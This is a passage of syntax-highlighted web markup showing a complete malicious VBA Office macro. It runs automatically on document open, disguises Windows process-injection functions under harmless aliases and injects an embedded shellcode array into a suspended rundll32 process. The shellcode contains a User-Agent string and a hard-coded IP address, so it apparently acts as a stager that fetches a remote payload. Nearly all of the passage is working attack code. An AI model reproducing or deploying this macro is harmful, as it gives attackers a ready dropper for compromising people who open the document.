class="built_in">String</span></span><br><span class="line">    lpTitle <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    dwX <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwY <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYSize <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwXCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwYCountChars <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFillAttribute <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    dwFlags <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    wShowWindow <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    cbReserved2 <span class="keyword">As</span> <span class="built_in">Integer</span></span><br><span class="line">    lpReserved2 <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdInput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdOutput <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    hStdError <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> LongPtr, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> LongPtr) <span class="keyword">As</span> LongPtr</span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDirectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateRemoteThread"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpThreadAttributes <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwStackSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpStartAddress <span class="keyword">As</span> <span class="built_in">Long</span>, lpParameter <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpThreadID <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> AllocStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"VirtualAllocEx"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lpAddr <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lSize <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flAllocationType <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> flProtect <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> WriteStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"WriteProcessMemory"</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> lDest <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByRef</span> Source <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Length <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> LengthWrote <span class="keyword">As</span> <span class="built_in">Long</span>) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line">    <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RunStuff <span class="keyword">Lib</span> <span class="string">"kernel32"</span> <span class="keyword">Alias</span> <span class="string">"CreateProcessA"</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="built_in">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="built_in">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="built_in">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDriectory <span class="keyword">As</span> <span class="built_in">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    <span class="keyword">Dim</span> pInfo <span class="keyword">As</span> PROCESS_INFORMATION</span><br><span class="line">    <span class="keyword">Dim</span> sInfo <span class="keyword">As</span> STARTUPINFO</span><br><span class="line">    <span class="keyword">Dim</span> sNull <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    <span class="keyword">Dim</span> sProc <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> VBA7 Then</span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> LongPtr, res <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">    <span class="keyword">Dim</span> rwxpage <span class="keyword">As</span> <span class="built_in">Long</span>, res <span class="keyword">As</span> <span class="built_in">Long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">End</span> <span class="meta-keyword">If</span></span></span><br><span class="line">    myArray = Array(<span class="number">-4</span>,<span class="number">-24</span>,<span class="number">-119</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">-119</span>,<span class="number">-27</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">100</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">48</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">12</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">20</span>,<span class="number">-117</span>,<span class="number">114</span>,<span class="number">40</span>,<span class="number">15</span>,<span class="number">-73</span>,<span class="number">74</span>,<span class="number">38</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">-63</span>,<span class="number">-49</span>, _</span><br><span class="line"><span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">-30</span>,<span class="number">-16</span>,<span class="number">82</span>,<span class="number">87</span>,<span class="number">-117</span>,<span class="number">82</span>,<span class="number">16</span>,<span class="number">-117</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-117</span>,<span class="number">64</span>,<span class="number">120</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">74</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">80</span>,<span class="number">-117</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-29</span>,<span class="number">60</span>,<span class="number">73</span>,<span class="number">-117</span>,<span class="number">52</span>,<span class="number">-117</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">-42</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">49</span>,<span class="number">-64</span>,<span class="number">-84</span>,<span class="number">-63</span>,<span class="number">-49</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">-57</span>,<span class="number">56</span>,<span class="number">-32</span>,<span class="number">117</span>,<span class="number">-12</span>,<span class="number">3</span>,<span class="number">125</span>,<span class="number">-8</span>,<span class="number">59</span>,<span class="number">125</span>,<span class="number">36</span>,<span class="number">117</span>,<span class="number">-30</span>,<span class="number">88</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">36</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">102</span>,<span class="number">-117</span>,<span class="number">12</span>,<span class="number">75</span>,<span class="number">-117</span>,<span class="number">88</span>,<span class="number">28</span>,<span class="number">1</span>,<span class="number">-45</span>,<span class="number">-117</span>,<span class="number">4</span>, _</span><br><span class="line"><span class="number">-117</span>,<span class="number">1</span>,<span class="number">-48</span>,<span class="number">-119</span>,<span class="number">68</span>,<span class="number">36</span>,<span class="number">36</span>,<span class="number">91</span>,<span class="number">91</span>,<span class="number">97</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">-1</span>,<span class="number">-32</span>,<span class="number">88</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">-117</span>,<span class="number">18</span>,<span class="number">-21</span>,<span class="number">-122</span>,<span class="number">93</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">84</span>,<span class="number">104</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">121</span>,<span class="number">-89</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-23</span>,<span class="number">-124</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-55</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">106</span>,<span class="number">3</span>,<span class="number">81</span>,<span class="number">81</span>,<span class="number">104</span>,<span class="number">-46</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">87</span>,<span class="number">-119</span>,<span class="number">-97</span>, _</span><br><span class="line"><span class="number">-58</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-21</span>,<span class="number">112</span>,<span class="number">91</span>,<span class="number">49</span>,<span class="number">-46</span>,<span class="number">82</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="number">-124</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">82</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-21</span>,<span class="number">85</span>,<span class="number">46</span>,<span class="number">59</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-58</span>,<span class="number">-125</span>,<span class="number">-61</span>,<span class="number">80</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">-1</span>,<span class="number">83</span>,<span class="number">86</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">45</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">123</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">15</span>,<span class="number">-124</span>,<span class="number">-61</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-123</span>,<span class="number">-10</span>,<span class="number">116</span>,<span class="number">4</span>,<span class="number">-119</span>,<span class="number">-7</span>,<span class="number">-21</span>,<span class="number">9</span>,<span class="number">104</span>,<span class="number">-86</span>,<span class="number">-59</span>,<span class="number">-30</span>,<span class="number">93</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-119</span>,<span class="number">-63</span>,<span class="number">104</span>,<span class="number">69</span>,<span class="number">33</span>,<span class="number">94</span>,<span class="number">49</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-43</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">87</span>,<span class="number">106</span>,<span class="number">7</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">80</span>,<span class="number">104</span>,<span class="number">-73</span>,<span class="number">87</span>,<span class="number">-32</span>,<span class="number">11</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-65</span>,<span class="number">0</span>,<span class="number">47</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">57</span>,<span class="number">-57</span>,<span class="number">116</span>,<span class="number">-73</span>,<span class="number">49</span>,<span class="number">-1</span>,<span class="number">-23</span>,<span class="number">-111</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-23</span>,<span class="number">-55</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-24</span>,<span class="number">-117</span>,<span class="number">-1</span>, _</span><br><span class="line"><span class="number">-1</span>,<span class="number">-1</span>,<span class="number">47</span>,<span class="number">74</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">52</span>,<span class="number">0</span>,<span class="number">71</span>,<span class="number">-37</span>,<span class="number">19</span>,<span class="number">-87</span>,<span class="number">58</span>,<span class="number">-110</span>,<span class="number">11</span>,<span class="number">66</span>,<span class="number">63</span>,<span class="number">40</span>,<span class="number">-36</span>,<span class="number">-114</span>,<span class="number">-75</span>,<span class="number">-101</span>,<span class="number">62</span>,<span class="number">108</span>,<span class="number">29</span>,<span class="number">-115</span>,<span class="number">-75</span>,<span class="number">-106</span>,<span class="number">35</span>,<span class="number">-3</span>,<span class="number">71</span>,<span class="number">126</span>,<span class="number">24</span>,<span class="number">-107</span>,<span class="number">101</span>,<span class="number">80</span>,<span class="number">116</span>,<span class="number">13</span>,<span class="number">70</span>,<span class="number">52</span>, _</span><br><span class="line"><span class="number">101</span>,<span class="number">6</span>,<span class="number">59</span>,<span class="number">-12</span>,<span class="number">-45</span>,<span class="number">32</span>,<span class="number">103</span>,<span class="number">-104</span>,<span class="number">10</span>,<span class="number">62</span>,<span class="number">77</span>,<span class="number">18</span>,<span class="number">-84</span>,<span class="number">12</span>,<span class="number">58</span>,<span class="number">23</span>,<span class="number">80</span>,<span class="number">56</span>,<span class="number">-75</span>,<span class="number">32</span>,<span class="number">-39</span>,<span class="number">8</span>,<span class="number">-80</span>,<span class="number">107</span>,<span class="number">-43</span>,<span class="number">108</span>,<span class="number">71</span>,<span class="number">63</span>,<span class="number">20</span>,<span class="number">41</span>,<span class="number">-82</span>,<span class="number">-42</span>,<span class="number">23</span>,<span class="number">58</span>,<span class="number">-126</span>,<span class="number">98</span>,<span class="number">-100</span>,<span class="number">-108</span>,<span class="number">-126</span>,<span class="number">76</span>, _</span><br><span class="line"><span class="number">-44</span>,<span class="number">0</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">45</span>,<span class="number">65</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">77</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">77</span>, _</span><br><span class="line"><span class="number">83</span>,<span class="number">73</span>,<span class="number">69</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">32</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">84</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">100</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">66</span>,<span class="number">79</span>, _</span><br><span class="line"><span class="number">73</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">69</span>,<span class="number">78</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">41</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">53</span>,<span class="number">-24</span>,<span class="number">107</span>,<span class="number">-26</span>,<span class="number">-93</span>,<span class="number">106</span>,<span class="number">-40</span>,<span class="number">-71</span>,<span class="number">-105</span>,<span class="number">-127</span>,<span class="number">-22</span>,<span class="number">100</span>,<span class="number">-16</span>,<span class="number">117</span>,<span class="number">-9</span>,<span class="number">83</span>,<span class="number">112</span>,<span class="number">-101</span>,<span class="number">60</span>,<span class="number">-4</span>,<span class="number">105</span>,<span class="number">72</span>,<span class="number">-127</span>,<span class="number">96</span>,<span class="number">-60</span>, _</span><br><span class="line"><span class="number">-29</span>,<span class="number">27</span>,<span class="number">-62</span>,<span class="number">-29</span>,<span class="number">98</span>,<span class="number">-95</span>,<span class="number">-56</span>,<span class="number">-46</span>,<span class="number">-6</span>,<span class="number">-57</span>,<span class="number">-39</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">-70</span>,<span class="number">101</span>,<span class="number">-16</span>,<span class="number">86</span>,<span class="number">-85</span>,<span class="number">-15</span>,<span class="number">25</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">-46</span>,<span class="number">-118</span>,<span class="number">-62</span>,<span class="number">1</span>,<span class="number">-19</span>,<span class="number">85</span>,<span class="number">56</span>,<span class="number">18</span>,<span class="number">-105</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">102</span>,<span class="number">116</span>,<span class="number">-54</span>,<span class="number">50</span>,<span class="number">-67</span>,<span class="number">81</span>,<span class="number">-20</span>, _</span><br><span class="line"><span class="number">40</span>,<span class="number">-19</span>,<span class="number">-52</span>,<span class="number">101</span>,<span class="number">6</span>,<span class="number">116</span>,<span class="number">118</span>,<span class="number">-128</span>,<span class="number">-118</span>,<span class="number">-9</span>,<span class="number">-46</span>,<span class="number">-96</span>,<span class="number">-122</span>,<span class="number">116</span>,<span class="number">-70</span>,<span class="number">107</span>,<span class="number">-54</span>,<span class="number">-78</span>,<span class="number">59</span>,<span class="number">119</span>,<span class="number">-51</span>,<span class="number">-52</span>,<span class="number">5</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">-9</span>,<span class="number">-60</span>,<span class="number">102</span>,<span class="number">-96</span>,<span class="number">109</span>,<span class="number">-90</span>,<span class="number">-122</span>,<span class="number">-92</span>,<span class="number">-81</span>,<span class="number">34</span>,<span class="number">-70</span>,<span class="number">-106</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">121</span>, _</span><br><span class="line"><span class="number">-6</span>,<span class="number">-5</span>,<span class="number">-12</span>,<span class="number">107</span>,<span class="number">-44</span>,<span class="number">73</span>,<span class="number">-31</span>,<span class="number">52</span>,<span class="number">87</span>,<span class="number">-89</span>,<span class="number">13</span>,<span class="number">77</span>,<span class="number">-121</span>,<span class="number">-68</span>,<span class="number">-37</span>,<span class="number">74</span>,<span class="number">-23</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">-122</span>,<span class="number">79</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">-39</span>,<span class="number">58</span>,<span class="number">121</span>,<span class="number">-100</span>,<span class="number">20</span>,<span class="number">53</span>,<span class="number">28</span>,<span class="number">27</span>,<span class="number">-15</span>,<span class="number">29</span>,<span class="number">52</span>,<span class="number">-107</span>,<span class="number">127</span>,<span class="number">-89</span>,<span class="number">40</span>,<span class="number">-4</span>,<span class="number">-122</span>, _</span><br><span class="line"><span class="number">-73</span>,<span class="number">-101</span>,<span class="number">75</span>,<span class="number">-64</span>,<span class="number">-59</span>,<span class="number">111</span>,<span class="number">105</span>,<span class="number">16</span>,<span class="number">79</span>,<span class="number">-121</span>,<span class="number">7</span>,<span class="number">33</span>,<span class="number">-121</span>,<span class="number">58</span>,<span class="number">125</span>,<span class="number">79</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">-97</span>,<span class="number">-45</span>,<span class="number">25</span>,<span class="number">105</span>,<span class="number">90</span>,<span class="number">-99</span>,<span class="number">6</span>,<span class="number">38</span>,<span class="number">74</span>,<span class="number">-22</span>,<span class="number">86</span>,<span class="number">17</span>,<span class="number">-99</span>,<span class="number">-58</span>,<span class="number">-36</span>,<span class="number">55</span>,<span class="number">5</span>,<span class="number">-96</span>,<span class="number">-109</span>,<span class="number">48</span>,<span class="number">42</span>,<span class="number">-66</span>, _</span><br><span class="line"><span class="number">-23</span>,<span class="number">-116</span>,<span class="number">-38</span>,<span class="number">-13</span>,<span class="number">-33</span>,<span class="number">89</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">90</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">-33</span>,<span class="number">-48</span>,<span class="number">77</span>,<span class="number">24</span>,<span class="number">-76</span>,<span class="number">-11</span>,<span class="number">44</span>,<span class="number">50</span>,<span class="number">-68</span>,<span class="number">-127</span>,<span class="number">-70</span>,<span class="number">-43</span>,<span class="number">0</span>,<span class="number">104</span>,<span class="number">-16</span>,<span class="number">-75</span>,<span class="number">-94</span>,<span class="number">86</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>, _</span><br><span class="line"><span class="number">104</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">88</span>,<span class="number">-92</span>,<span class="number">83</span>,<span class="number">-27</span>,<span class="number">-1</span>,<span class="number">-43</span>,<span class="number">-109</span>,<span class="number">-71</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-39</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">-119</span>,<span class="number">-25</span>,<span class="number">87</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">83</span>,<span class="number">86</span>,<span class="number">104</span>,<span class="number">18</span>,<span class="number">-106</span>,<span class="number">-119</span>,<span class="number">-30</span>,<span class="number">-1</span>,<span class="number">-43</span>, _</span><br><span class="line"><span class="number">-123</span>,<span class="number">-64</span>,<span class="number">116</span>,<span class="number">-58</span>,<span class="number">-117</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">-61</span>,<span class="number">-123</span>,<span class="number">-64</span>,<span class="number">117</span>,<span class="number">-27</span>,<span class="number">88</span>,<span class="number">-61</span>,<span class="number">-24</span>,<span class="number">-87</span>,<span class="number">-3</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">0</span>,<span class="number">111</span>,<span class="number">-86</span>,<span class="number">81</span>,<span class="number">-61</span>)</span><br><span class="line">    <span class="keyword">If</span> Len(Environ(<span class="string">"ProgramW6432"</span>)) &gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\SysWOW64\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        sProc = Environ(<span class="string">"windir"</span>) &amp; <span class="string">"\\System32\\rundll32.exe"</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, <span class="keyword">ByVal</span> <span class="number">1</span>&amp;, <span class="keyword">ByVal</span> <span class="number">4</span>&amp;, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, <span class="number">0</span>, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    <span class="keyword">For</span> offset = LBound(myArray) <span class="keyword">To</span> UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, <span class="number">1</span>, <span class="keyword">ByVal</span> <span class="number">0</span>&amp;)</span><br><span class="line">    <span class="keyword">Next</span> offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, <span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span 